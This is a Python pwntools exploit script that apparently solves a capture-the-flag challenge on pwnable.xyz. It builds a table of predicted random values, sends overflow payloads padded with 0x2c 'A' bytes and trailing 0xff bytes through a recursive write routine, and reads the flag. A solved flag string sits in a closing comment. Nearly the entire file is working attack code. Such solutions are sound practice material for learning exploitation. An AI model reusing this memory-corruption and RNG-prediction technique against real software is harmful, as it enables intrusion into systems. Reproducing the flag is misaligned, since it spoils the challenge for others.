from pwn import *
import time

# Might have to patch out the binary so that it generates the same random value each time 

def build_dict():
    f = open('./dictionary.txt', 'r').read()
    f = f.split("Initializing new srand\n")
    vals = []
    for i in f:
        if len(i) > 3:
            vals.append(i[:-1])
    vals2 = []
    for i in vals:
        temp = []
        for j in i.split("\n"):
            temp.append(int(j))
        vals2.append(temp)
    return vals2



# wrapper to execute and then exit when we dont hit 
def exp(a, counter):
    print("counter: ", counter);
    payload = b"A" * 0x2c
    #r = process('./challenge')
    r = remote('svc.pwnable.xyz', 30024)
    r.sendlineafter(": ", "Y")
    r.sendafter(": ", payload)
    r.sendlineafter("> ", "2")

    '''
    Need a quick dictionary to find all the possibilities for the rand values

    '''
    l = r.recvline()
    print("line: ", l)
    to_try = a[0]
# 
    """ for i in range(1<<24): """
    print("Sending: ", to_try[0])
    r.sendlineafter("pawa> ", str(to_try[0]))
    l = r.recv(10)
    print("line: ", l)

    if b"score" in l:
        print("Too big")    
        print("Retrying")
        r.close()
        return 
    elif b"Sowwy" in l:
        print("Too smol")
        print("Retrying")
        r.close()
        return 

    #gdb.attach(r)
    time.sleep(1)
    assert len(payload) == 0x2c
    
    r.sendafter("]", "n") # this is to detect the initial seed value 

    # starting at the array integer position 1 and alternating to increment by 1
    # first value to send is one slightly larger so we can increment the counter by 1
    # ok, the recursion should be 0xff, 0xff 0xff, 0xff 0xff 0xff etc.
    '''
    use r(1) to make r(2)
    r(2):
    r(1), 
    then add 1
    r(1),
    then write both 

    r(2)
    add 1,
    r(2),
    then write all three

    r(3),
    add 1,
    r(3)
    then write all four etc. etc.
    '''
    pos = 1
    def add_one(pos):
        print("add one pos: ", pos)
        r.sendlineafter("pawa> ", str(int(to_try[pos]) + 1)) # add one to the payload we can send
        pos += 1
        return pos 

    def write_n(pos, p): # p = payload
        print("write n pos: ", pos)
        assert (int(to_try[pos]) > 0)
        r.sendlineafter("pawa> ", str(int(to_try[pos])))
        r.sendafter("y]", "y")
        r.sendafter(": ", p)
        pos += 1
        return pos

    def recurse(n, pos):
        if (n == 1):
            pos = add_one(pos)
            pos = write_n(pos, payload + b'\xff')
        else:
            pos = recurse(n-1, pos)
            pos = add_one(pos)
            pos = recurse(n-1, pos)
            pos = write_n(pos, payload + b'\xff' * n)
        return pos
    recurse(8, 1)
    # read flag
    r.sendlineafter("pawa> ", "0")

   
    r.interactive()

def main():
    #exp()
    a = build_dict()
    print(a)
    #b = [i[0] for i in a]
    #print(b)
    for i in range(1000):
        exp(a, i)

if __name__ == '__main__':
    main()
    # Flag: FLAG{aka_caped_baldy}
